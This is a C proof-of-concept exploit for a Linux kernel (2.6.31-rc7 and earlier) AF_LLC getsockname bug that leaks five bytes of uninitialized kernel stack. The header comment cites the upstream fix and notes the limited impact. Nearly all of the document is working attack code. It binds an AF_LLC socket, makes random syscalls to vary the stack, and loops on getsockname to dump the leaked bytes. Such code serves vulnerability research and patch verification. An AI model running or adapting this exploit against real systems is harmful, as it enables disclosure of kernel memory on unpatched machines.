=====================================================================
Linux Kernel <= 2.6.31-rc7 AF_LLC getsockname 5-Byte Stack Disclosure
=====================================================================


/* 
 * llc-getsockname-leak.c
 *
 * Linux Kernel <= 2.6.31-rc7 AF_LLC getsockname 5-Byte Stack Disclosure
 * 
 * Information:
 * 
 *   http://git.kernel.org/linus/28e9fc592cb8c7a43e4d3147b38be6032a0e81bc 
 *
 *   sllc_arphrd member of sockaddr_llc might not be changed. Zero sllc
 *   before copying to the above layer's structure.
 * 
 * Notes:
 * 
 *   Bug is present in <= 2.6.31-rc7, but the impact is limited to <= 2.6.24.4
 *   as AF_LLC sockets have been restricted to CAP_NET_RAW since then. Only 5 
 *   bytes of uninitialized kernel stack are leaked via AF_LLC's getsockname().
 */

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <net/if_arp.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#ifndef AF_LLC
#define AF_LLC 26
#endif

#ifndef LLC_SAP_NULL
#define LLC_SAP_NULL 0x00
#endif

#ifndef __LLC_SOCK_SIZE__
#define __LLC_SOCK_SIZE__ 16
struct sockaddr_llc {
	sa_family_t     sllc_family;
	sa_family_t     sllc_arphrd;
	unsigned char   sllc_test;
	unsigned char   sllc_xid;
	unsigned char   sllc_ua;
	unsigned char   sllc_sap;
	unsigned char   sllc_mac[6];
	unsigned char   __pad[__LLC_SOCK_SIZE__ - sizeof(sa_family_t) * 2 -
	                      sizeof(unsigned char) * 4 - 6];
};
#endif

const int randcalls[] = {
	__NR_read, __NR_write, __NR_open, __NR_close, __NR_stat, __NR_lstat,
	__NR_lseek, __NR_rt_sigaction, __NR_rt_sigprocmask, __NR_ioctl, 
	__NR_access, __NR_pipe, __NR_sched_yield, __NR_mremap, __NR_dup, 
	__NR_dup2, __NR_getitimer, __NR_setitimer, __NR_getpid, __NR_fcntl, 
	__NR_flock, __NR_getdents, __NR_getcwd, __NR_gettimeofday, 
	__NR_getrlimit, __NR_getuid, __NR_getgid, __NR_geteuid, __NR_getegid,
	__NR_getppid, __NR_getpgrp, __NR_getgroups, __NR_getresuid, 
	__NR_getresgid, __NR_getpgid, __NR_getsid,__NR_getpriority, 
	__NR_sched_getparam, __NR_sched_get_priority_max
};

void
dump(const unsigned char *p, unsigned l)
{
	printf("sockaddr_llc:");
	while (l > 0) {
		printf(" ");
		if (l == 12 || l == 2) {
			printf("*** ");
		}
		printf("%02x", *p);
		if (l == 10 || l == 1) {
			printf(" ***");
		}
		++p; --l;
	}
	printf("\n");
}

int
main(void)
{
	struct sockaddr_llc sllc;
	int ret, sock, call, sllc_len = sizeof(sllc);
	
	printf("[+] Creating AF_LLC socket.\n");

	sock = socket(AF_LLC, SOCK_DGRAM, 0);
	if (sock == -1) {
		printf("[-] Error: Couldn't create AF_LLC socket.\n");
		printf("[-] %s.\n", strerror(errno));
		exit(1);
	}

	memset(&sllc, 0, sllc_len);

	sllc.sllc_family = AF_LLC;
	sllc.sllc_arphrd = ARPHRD_ETHER;
	sllc.sllc_sap = LLC_SAP_NULL;
	
	printf("[+] Dummy sendto to autobind socket.\n");

	ret = sendto(sock, "LEAK", 4, 0, (struct sockaddr *) &sllc, sllc_len);
	if (ret == -1) {
		printf("[-] Error: sendto failed.\n");
		printf("[-] %s.\n", strerror(errno));
		exit(1);
	}

	printf("[+] Ready to call getsockname.\n\n");

	for (ret = 5; ret > 0; ret--) {
		printf("%d...\n", ret);
		sleep(1);
	}
	srand(time(NULL));

	while (1) {
		/* random stuff to make stack pseudo-interesting */
		call = rand() % (sizeof(randcalls) / sizeof(int));
		syscall(randcalls[call]);

		ret = getsockname(sock, (struct sockaddr *) &sllc, &sllc_len);
		if (ret != 0) {
			printf("[-] Error: getsockname failed.\n");
			printf("[-] %s.\n", strerror(errno));
			exit(1);
		}

		dump((unsigned char *) &sllc, sizeof(sllc));
	}

	return 0;
}

